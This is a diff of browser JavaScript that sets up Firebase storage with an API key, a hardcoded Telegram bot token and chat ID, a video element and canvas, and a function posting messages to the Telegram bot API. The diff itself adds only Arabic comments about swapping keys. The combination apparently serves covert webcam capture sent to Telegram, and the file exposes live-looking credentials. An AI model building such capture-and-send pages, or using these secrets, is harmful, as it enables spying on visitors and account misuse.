@@ -2,6 +2,7 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase
 import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js";
 import { getDatabase, ref as dbRef, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
 
+// هنا استبدلت المفاتيح القديمة بمفاتيح جديدة
 const firebaseConfig = {
   apiKey: "AIzaSyAPd-LuhhGPJqg4f9v7-s8-KxHwVkDAfOo",
   authDomain: "omarocoo-5c4a1.firebaseapp.com",
@@ -16,13 +17,14 @@ const app = initializeApp(firebaseConfig);
 const storage = getStorage(app);
 const database = getDatabase(app);
 
-const TELEGRAM_BOT_TOKEN = "7639077977:AAENzzjVLnZIFj8FtryqN4JFED7HUSBP0-w";
-const CHAT_ID = "7927406022";
+const TELEGRAM_BOT_TOKEN = "7639077977:AAENzzjVLnZIFj8FtryqN4JFED7HUSBP0-w"; // استبدل هذا بتوكن البوت الجديد
+const CHAT_ID = "7927406022"; // استبدل هذا برقم الدردشة الجديد
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const context = canvas.getContext('2d');
 
+// باقي الكود كما هو
 async function sendTelegramText(text) {
   await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
     method: "POST",
